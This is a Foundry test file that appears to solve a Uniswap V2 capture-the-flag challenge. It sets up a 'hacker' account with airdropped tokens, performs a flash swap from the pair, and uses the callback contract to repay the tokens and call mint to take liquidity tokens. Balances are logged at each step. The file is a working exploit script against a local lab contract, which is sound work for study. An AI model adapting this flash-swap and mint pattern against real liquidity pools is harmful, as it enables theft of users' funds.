pragma solidity ^0.8.0;

import "../src/Challenge.sol";
import "../src/UpsideToken.sol";
import "../src/UniswapV2Pair.sol";
import "../src/UniswapV2ERC20.sol";
import "../src/interfaces/IUniswapV2ERC20.sol";

import {Test, console} from "../lib/forge-std/src/Test.sol";

contract UniswapV2Test is Test {
    address public owner = address(0x01);
    address public hacker = address(0x02);

    UpsideToken public tokenA;
    UpsideToken public tokenB;
    Challenge public challenge;
    UniswapV2Pair public pair;

    UniswapV2AttackTest public attack = new UniswapV2AttackTest();

    function setUp() external {
        // Setup
        vm.deal(hacker, 100 ether);

        vm.startPrank(owner);
        challenge = new Challenge();

        tokenA = UpsideToken(address(challenge.tokenA()));
        tokenB = UpsideToken(address(challenge.tokenB()));

        pair = UniswapV2Pair(address(challenge.pair()));

        vm.stopPrank();

        vm.startPrank(hacker);

        console.log("\nBefore airdrop");
        printBalance(address(hacker), address(pair));

        challenge.airdrop();

        console.log("\nAfter airdrop");
        printBalance(address(hacker), address(pair));

        vm.stopPrank();
    }

    function test_attack() external {
        vm.startPrank(hacker);
        
        console.log("Call swap");

        pair.swap(99.1 ether, 99.1 ether, address(attack), bytes("1"));

        vm.stopPrank();
    }


    function printBalance(address _hacker, address _pair) public view {
        console.log("hacker's tokenA balance (ether):", tokenA.balanceOf(address(_hacker)) / 10 ** 18);
        console.log("hacker's tokenB balance (ether):", tokenB.balanceOf(address(_hacker)) / 10 ** 18);
        console.log("pair's tokenA balance (ether):", tokenA.balanceOf(address(_pair)) / 10 ** 18);
        console.log("pair's tokenB balance (ether):", tokenB.balanceOf(address(_pair)) / 10 ** 18);
    }
}

contract UniswapV2AttackTest is Test {
    address public hacker = address(0x02);
    UniswapV2Pair public pair;
    IERC20 public token0;
    IERC20 public token1;

    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data         // 여기는 사실상 의미 없음.
    ) external {
        // from : address(this)
        // to : msg.sender (UniswapV2Pair)
        pair = UniswapV2Pair(msg.sender);

        token0 = IERC20(pair.token0());
        token1 = IERC20(pair.token1());

        console.log("uniswapV2Call - amount0:", amount0 / 10 ** 17);
        console.log("uniswapV2Call - amount1:", amount1 / 10 ** 17);

        console.log("\n------------BEFORE TRANSFER------------");
        console.log("uniswapV2Call - address(this)(UniswapV2AttackTest) token0:", token0.balanceOf(address(this)) / 10 ** 17);
        console.log("uniswapV2Call - address(this)(UniswapV2AttackTest) token1:", token1.balanceOf(address(this)) / 10 ** 17);
        console.log("uniswapV2Call - msg.sender(UniswapV2Pair) token0:", token0.balanceOf(msg.sender) / 10 ** 17);
        console.log("uniswapV2Call - msg.sender(UniswapV2Pair) token1:", token1.balanceOf(msg.sender) / 10 ** 17);
        console.log("uniswapV2Call - hacker token0:", token0.balanceOf(hacker) / 10 ** 17);
        console.log("uniswapV2Call - hacker token1:", token1.balanceOf(hacker) / 10 ** 17);

        token0.approve(address(this), amount0);
        token0.transferFrom(address(this), msg.sender, amount0);

        token1.approve(address(this), amount1);
        token1.transferFrom(address(this), msg.sender, amount1);

        console.log("\n------------AFTER TRANSFER------------");
        console.log("uniswapV2Call - address(this)(UniswapV2AttackTest) token0:", token0.balanceOf(address(this)) / 10 ** 17);
        console.log("uniswapV2Call - address(this)(UniswapV2AttackTest) token1:", token1.balanceOf(address(this)) / 10 ** 17);
        console.log("uniswapV2Call - msg.sender(UniswapV2Pair) token0:", token0.balanceOf(msg.sender) / 10 ** 17);
        console.log("uniswapV2Call - msg.sender(UniswapV2Pair) token1:", token1.balanceOf(msg.sender) / 10 ** 17);
        console.log("uniswapV2Call - hacker token0:", token0.balanceOf(hacker) / 10 ** 17);
        console.log("uniswapV2Call - hacker token1:", token1.balanceOf(hacker) / 10 ** 17);

        pair.mint(address(this));
    }
}